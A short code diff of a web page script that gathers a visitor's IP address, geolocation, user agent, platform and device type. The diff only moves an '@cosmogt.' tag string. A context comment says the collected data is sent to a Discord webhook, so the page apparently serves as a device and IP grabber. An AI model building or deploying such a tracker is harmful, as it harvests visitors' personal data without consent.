@@ -61,7 +61,7 @@
             // Display user's information
             const infoElement = document.getElementById('info');
             const infoText = `
-              @cosmogt. Your Device Information:
+              Your Device Information:
               IP Address: ${ipAddress}
               Geolocation: ${geolocationData}
               User Agent: ${userAgent}
@@ -70,6 +70,7 @@
               Platform: ${platform}
               Device Type: ${deviceType}
             `;
+            "@cosmogt."
             infoElement.innerText = infoText;
 
             // Send the payload to the Discord webhook
